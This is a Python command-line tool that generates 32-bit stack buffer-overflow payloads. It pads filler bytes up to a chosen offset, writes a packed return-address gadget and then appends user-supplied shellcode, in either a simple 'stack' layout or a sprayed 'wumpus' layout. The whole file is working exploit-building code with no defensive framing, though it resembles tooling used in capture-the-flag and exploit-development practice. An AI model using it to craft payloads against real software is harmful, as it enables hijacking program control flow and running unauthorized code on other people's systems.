#!/usr/bin/env python3
"""Build parameterized 32-bit stack payloads."""

from __future__ import annotations

import argparse
import binascii
import struct
import sys


def main() -> None:
  parser = argparse.ArgumentParser()
  subparsers = parser.add_subparsers(dest='action', required=True)

  stackParser = subparsers.add_parser('stack')
  stackParser.add_argument('offset', type=int)
  stackParser.add_argument('gadget', type=lambda value: int(value, 0))
  stackParser.add_argument('shellcodeHex')
  stackParser.add_argument('--filler', default='41')

  wumpusParser = subparsers.add_parser('wumpus')
  wumpusParser.add_argument('sprayLength', type=int)
  wumpusParser.add_argument('returnOffset', type=int)
  wumpusParser.add_argument('gadget', type=lambda value: int(value, 0))
  wumpusParser.add_argument('shellcodeHex')
  wumpusParser.add_argument('--filler', default='41')

  args = parser.parse_args()
  filler = binascii.unhexlify(args.filler)
  if len(filler) != 1:
    raise ValueError('Failed to build payload: filler must be one byte')

  shellcode = binascii.unhexlify(args.shellcodeHex)
  if args.action == 'stack':
    payload = buildStackPayload(args.offset, args.gadget, shellcode, filler)
  else:
    payload = buildWumpusPayload(
      args.sprayLength,
      args.returnOffset,
      args.gadget,
      shellcode,
      filler,
    )
  sys.stdout.buffer.write(payload)


def buildStackPayload(
  offset: int,
  gadget: int,
  shellcode: bytes,
  filler: bytes = b'A',
) -> bytes:
  ensurePayloadParts(offset, gadget, shellcode, filler)
  return filler * offset + struct.pack('<I', gadget) + shellcode


def buildWumpusPayload(
  sprayLength: int,
  returnOffset: int,
  gadget: int,
  shellcode: bytes,
  filler: bytes = b'A',
) -> bytes:
  ensurePayloadParts(returnOffset, gadget, shellcode, filler)
  if sprayLength < 1:
    raise ValueError('Failed to build Wumpus payload: spray length must be positive')
  if returnOffset + 4 + len(shellcode) > sprayLength:
    raise ValueError('Failed to build Wumpus payload: control bytes exceed the spray')

  payload = bytearray(filler * sprayLength)
  payload[returnOffset:returnOffset + 4] = struct.pack('<I', gadget)
  shellcodeOffset = returnOffset + 4
  payload[shellcodeOffset:shellcodeOffset + len(shellcode)] = shellcode
  return bytes(payload)


def ensurePayloadParts(
  offset: int,
  gadget: int,
  shellcode: bytes,
  filler: bytes,
) -> None:
  if offset < 0:
    raise ValueError('Failed to build payload: offset must not be negative')
  if not 0 <= gadget <= 0xffffffff:
    raise ValueError('Failed to build payload: gadget must fit in 32 bits')
  if not shellcode:
    raise ValueError('Failed to build payload: shellcode is empty')
  if len(filler) != 1:
    raise ValueError('Failed to build payload: filler must be one byte')


if __name__ == '__main__':
  main()

